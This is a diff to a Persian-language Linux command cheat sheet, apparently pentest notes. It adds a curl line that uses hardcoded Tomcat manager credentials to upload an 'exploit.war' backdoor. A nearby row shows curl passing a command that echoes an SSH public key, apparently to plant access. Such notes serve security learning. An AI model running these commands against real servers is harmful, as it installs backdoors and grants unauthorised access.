@@ -94,6 +94,8 @@ published: true
 | id -u <username> | دریافت id کاربر |
 | cut -d: -f3 < <(getent group GROUPNAME) | دریافت id گروه |
 | curl -G 'http://example.com/file.php' --data-urlencode 'cmd=echo ssh-rsa AA...........' | ارسال اطلاعات با متد get در curl |
+| curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://megahosting.com:8080/ma
+nager/text/deploy?path=/exploit.war" | ایجاد backdoor با آسیب پذیری lfi در java |
 
 ## دستورات فایل
 
